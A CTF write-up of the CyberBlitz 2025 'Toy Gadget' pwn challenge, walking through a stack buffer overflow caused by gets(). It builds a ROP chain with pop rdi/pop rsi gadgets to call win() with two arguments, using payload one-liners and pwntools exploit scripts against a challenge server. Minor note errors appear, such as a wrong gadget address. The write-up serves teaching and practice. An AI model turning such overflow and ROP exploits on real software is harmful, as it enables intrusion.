---
title: Toy Gadget
author: yufong
categories:  [CyberBlitz 2025, Pwn]
date: 2025-12-22
tags: 
  - 64-bit
  - ret2win
info:
  description: "I require help to read the flag. Help me please!"
  difficulty: 1
img_path: /_posts/Writeups/CTF/CyberBlitz%202025/Pwn/Toy%20Gadgets/attachments/
image:
  path: /_posts/Writeups/CTF/CyberBlitz%202025/Pwn/Toy%20Gadgets/attachments/cyberblitz2025.png
  width: 1000   # in pixels
  height: 400   # in pixels
---

## Challenge Description

{{page.info.description}}

## Source Code

```
~/labs/ctf/cyberblitz2025/pwn/toy_gadget
venv3 ❯ ~/labs/tools/ghidra.py gadget
```

Functions

![]({{ page.img_path }}toy_gadget-1766342988126.png)

Main

![]({{ page.img_path }}toy_gadget-1766342952838.png)

Question

![]({{ page.img_path }}toy_gadget-1766342936439.png)

>[!WARNING] `gets` used, susceptible to buffer overflow


Win

![]({{ page.img_path }}toy_gadget-1766343082553.png)

> To Note
>- Argument 1
>	- `0xed0cdaed`
>	- `\xed\xda\x0c\xed\x00\x00\x00\x00`
>- Argument 2
>	- `0xdeadc0de`
>	- `\xde\xc0\xad\xde\x00\x00\x00\x00`

![]({{ page.img_path }}toy_gadget-1766345257682.png)

> To Note
>- Address: `0x4011c0`
>- Little-Endian: `\xc0\x11\x40\x00\x00\x00\x00\x00`

The objective is to redirect execution flow to the `win` function while correctly setting its two required arguments.


## Exploit

### Check Security

```
~/labs/ctf/cyberblitz2025/pwn/toy_gadget
❯ file gadget
gadget: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cffc44ddeb8860288d84f91eccfed7b5a96453cb, for GNU/Linux 3.2.0, not stripped
```

> Breakdown
>- The binary is not stripped, meaning symbol information is preserved.
>- Function names (e.g. `main`, `win`) and symbol addresses are available.
>- TLDR, easier to understand when rev.

```
~/labs/ctf/cyberblitz2025/pwn/toy_gadget
❯ checksec --file=./gadget --format=json | jq
{
  "./gadget": {
    "relro": "partial",
    "canary": "no",
    "nx": "yes",
    "pie": "no",
    "rpath": "no",
    "runpath": "no",
    "symbols": "yes",
    "fortify_source": "no",
    "fortified": "0",
    "fortify-able": "3"
  }
}
```

> Breakdown
>- `canary: no`
>	- Don't need to find offset to canary. The return address can be overwritten directly.
>- `nx:yes`
>	- The stack is non-executable, preventing injected shellcode from running.
>	- Don't matter here since its a `ret2win` challenge.
>- `pie:no`
>	- The binary is loaded at a fixed base address.
>	- Don't need PIE leak.

### Vulnerability Analysis

1. View functions

	```
	pwndbg> info func
	All defined functions:
	
	Non-debugging symbols:
	0x0000000000401000  _init
	0x0000000000401030  puts@plt
	0x0000000000401040  setbuf@plt
	0x0000000000401050  printf@plt
	0x0000000000401060  fgets@plt
	0x0000000000401070  gets@plt
	0x0000000000401080  fopen@plt
	0x0000000000401090  main
	0x00000000004010c0  _start
	0x00000000004010f0  _dl_relocate_static_pie
	0x0000000000401100  deregister_tm_clones
	0x0000000000401130  register_tm_clones
	0x0000000000401170  __do_global_dtors_aux
	0x00000000004011a0  frame_dummy
	0x00000000004011b0  callmee
	0x00000000004011c0  question
	0x00000000004011e0  win
	0x000000000040124c  _fini
	pwndbg>
	```

	>To Note
	>- Address: `4011e0`
	>- Little-Endian: `\xe0\x11\x40\x00\x00\x00\x00\x00`

2. Disassemble question

	```
	pwndbg> disas question
	Dump of assembler code for function question:
	   0x00000000004011c0 <+0>:     sub    rsp,0x48
	   0x00000000004011c4 <+4>:     mov    edi,0x402008
	   0x00000000004011c9 <+9>:     xor    eax,eax
	   0x00000000004011cb <+11>:    call   0x401050 <printf@plt>
	   0x00000000004011d0 <+16>:    mov    rdi,rsp
	   0x00000000004011d3 <+19>:    xor    eax,eax
	   0x00000000004011d5 <+21>:    call   0x401070 <gets@plt>
	   0x00000000004011da <+26>:    add    rsp,0x48
	   0x00000000004011de <+30>:    ret
	End of assembler dump.
	```

	>Breakdown
	>1. Allocates 72 bytes on the stack directly below the saved return address.
	>2. Passes the stack pointer as the destination buffer to `gets`.
	>	- No write limit at all.
	>3. Restores `rsp`, then `ret` loads the next 8 bytes from the stack into `rip`.
	>	- Execution is redirected if we overwrite RIP.

### Find RIP Offset

1. Generate pattern

	```
	pwndbg> cyclic 100
	aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
	pwndbg>
	```

	> Generate more than 72 bytes since the local stack buffer is 72 bytes.

2. Crash the program
	![]({{ page.img_path }}toy_gadget-1766343280102.png)

	> Breakdown
	>- The crash occurs **at `ret`**, so `RIP` still points to the `ret` instruction.

3. Find offset

	```
	pwndbg> cyclic -l jaaaaaaa
	Finding cyclic pattern of 8 bytes: b'jaaaaaaa' (hex: 0x6a61616161616161)
	Found at offset 72
	```

	> Breakdown
	>- The next **8 bytes after offset 72** fully control the return address.

### Find Gadgets

We need gadgets because for 64-bit, function arguments are passed via registers, rather than being read directly from the stack. 

Unlike 32-bit binaries where we can just add the 2 arguments right after the return function address.

1. Find `ret`

	```
	~/labs/ctf/cyberblitz2025/pwn/toy_gadget
	❯ ropper -f gadget --search "ret"
	
	[INFO] Load gadgets from cache
	[LOAD] loading... 100%
	[LOAD] removing double gadgets... 100%
	[INFO] Searching for gadgets: ret
	
	[INFO] File: gadget
	0x0000000000401042: ret 0x2f;
	0x0000000000401016: ret;
	```

	> To Note
	>- Utilized for stack alignment.
	>- Address: `401016`
	>- Little-Endian: `\x16\x10\x40\x00\x00\x00\x00\x00`
	

2. Find `pop rdi`

	```
	~/labs/ctf/cyberblitz2025/pwn/toy_gadget
	❯ ropper -f gadget --search "pop rdi"
	
	[INFO] Load gadgets from cache
	[LOAD] loading... 100%
	[LOAD] removing double gadgets... 100%
	[INFO] Searching for gadgets: pop rdi
	
	[INFO] File: gadget
	0x00000000004011b0: pop rdi; ret;
	```

	> To Note
	>- Utilized to set the first function argument (`rdi`).
	>- Address: `4011b0`
	>- Little-Endian: `\xb0\x11\x40\x00\x00\x00\x00\x00`
	

3. Find `pop rsi`

	```
	~/labs/ctf/cyberblitz2025/pwn/toy_gadget
	❯ ropper -f gadget --search "pop rsi"
	
	[INFO] Load gadgets from cache
	[LOAD] loading... 100%
	[LOAD] removing double gadgets... 100%
	[INFO] Searching for gadgets: pop rsi
	
	[INFO] File: gadget
	0x00000000004011b2: pop rsi; ret;
	```

	> To Note
	>- Utilized to set the first function argument (`rsi`).
	>- Address: `4011b0`
	>- Little-Endian: `\xb2\x11\x40\x00\x00\x00\x00\x00`
	

### Manual

1. Steps

	| Step | Purpose                 | Value        | Little-Endian                      |
	| ---- | ----------------------- | ------------ | ---------------------------------- |
	| 1    | Padding to RIP          | `72`         | -                                  |
	| 2    | Stack alignment (`ret`) | `0x401016`   | `\x16\x10\x40\x00\x00\x00\x00\x00` |
	| 3    | `pop rdi ; ret`         | `0x4011b0`   | `\xb0\x11\x40\x00\x00\x00\x00\x00` |
	| 4    | Argument 1 (`rdi`)      | `0xed0cdaed` | `\xed\xda\x0c\xed\x00\x00\x00\x00` |
	| 5    | `pop rsi ; ret`         | `0x4011b2`   | `\xb2\x11\x40\x00\x00\x00\x00\x00` |
	| 6    | Argument 2 (`rsi`)      | `0xdeadc0de` | `\xde\xc0\xad\xde\x00\x00\x00\x00` |
	| 7    | `win()`                 | `0x4011e0`   | `\xe0\x11\x40\x00\x00\x00\x00\x00` |

2. Create Payload

	```
	python2 -c 'print("A"*72+ "\xb0\x11\x40\x00\x00\x00\x00\x00" + "\xed\xda\x0c\xed\x00\x00\x00\x00" + "\xb2\x11\x40\x00\x00\x00\x00\x00" + "\xde\xc0\xad\xde\x00\x00\x00\x00" + "\xe0\x11\x40\x00\x00\x00\x00\x00" )' > payload
	```

	```
	python2 -c 'print(
	    "A"*72 +
	    "\xb0\x11\x40\x00\x00\x00\x00\x00" +  # pop rdi ; ret
	    "\xed\xda\x0c\xed\x00\x00\x00\x00" +  # 0xed0cdaed
	    "\xb2\x11\x40\x00\x00\x00\x00\x00" +  # pop rsi ; ret
	    "\xde\xc0\xad\xde\x00\x00\x00\x00" +  # 0xdeadc0de
	    "\xe0\x11\x40\x00\x00\x00\x00\x00"    # win
	)' > payload
	```

3. Send it

	```
	~/labs/ctf/cyberblitz2025/pwn/toy_gadget
	❯ cat payload | ./gadget
	Hello welcome to my challenge :)
	What do you know about Binary? :
	CyberBlitz2025{flag}
	[1]    985028 done                cat payload |
	       985029 segmentation fault  ./gadget
	```

	<video muted autoplay controls style="width: 740px; height: 460px;">
		<source src="{{site.cdn}}{{page.img_path}}spCJhivTgJ.mp4" type="video/mp4">
	</video>

4. Send it

	```python
	from pwn import *
	
	def get_payload():
	    with open("payload", "rb") as f:
	        return f.read()
	
	io = remote(sys.argv[1], int(sys.argv[2]))
	io.recvuntil(b'What do you know about Binary? :')
	io.send(get_payload() + b'\n')
	print(io.recvall(timeout=2))
	io.interactive()
	```
	<video muted autoplay controls style="width: 740px; height: 460px;">
		<source src="{{site.cdn}}{{page.img_path}}Ttwx3h5U9t.mp4" type="video/mp4">
	</video>

### Auto

> [code](https://example.com)

```python
from pwn import *

def start(argv=[], *a, **kw):
    if args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

def find_offset(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter(b':', payload)
    # Wait for the process to crash
    p.wait()
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# Set up pwntools for the correct architecture
exe = './gadget'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

offset = find_offset(cyclic(100))

# Start program
io = start()

# POP RDI gadget found with ropper
# pop_rdi = 0x4011b0
# pop_rsi = 0x4011b2
# ret = 0x401016
rop = ROP(exe)
ret     = rop.find_gadget(["ret"]).address
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
pop_rsi = rop.find_gadget(["pop rsi", "ret"]).address

# Build the payload
payload = flat({
    offset: [
        ret,
        pop_rdi,
        0xed0cdaed,
        pop_rsi,
        0xdeadc0de,
        elf.functions.win #0x4011e0
    ]
})

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendlineafter(b'What do you know about Binary? :', payload)
print(io.recvall(timeout=2).decode())

# Get flag
io.interactive()
```

```
~/labs/ctf/cyberblitz2025/pwn/toy_gadget
❯ python3 exploit.py REMOTE blitzinstance1.ddns.net 33511
[+] Starting local process './gadget': pid 1000630
[*] Process './gadget' stopped with exit code -11 (SIGSEGV) (pid 1000630)
[+] Parsing corefile...: Done
[*] '/home/kali/labs/ctf/cyberblitz2025/pwn/toy_gadget/core.1000630'
    Arch:      amd64-64-little
    RIP:       0x4011de
    RSP:       0x7fffffffdc38
    Exe:       '/home/kali/labs/ctf/cyberblitz2025/pwn/toy_gadget/gadget' (0x400000)
    Fault:     0x6161617461616173
[*] located EIP/RIP offset at 72
[+] Opening connection to blitzinstance1.ddns.net on port 33511: Done
[*] '/home/kali/labs/ctf/cyberblitz2025/pwn/toy_gadget/gadget'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[*] Loaded 11 cached gadgets for './gadget'
[+] Receiving all data: Done (40B)
[*] Closed connection to blitzinstance1.ddns.net port 33511

CyberBlitz2025{R0p_Ch@11n_your_Wa5555}

[*] Switching to interactive mode
[*] Got EOF while reading in interactive
```

<video muted autoplay controls style="width: 740px; height: 460px;">
	<source src="{{site.cdn}}{{page.img_path}}7ggoSnQgh2.mp4" type="video/mp4">
</video>


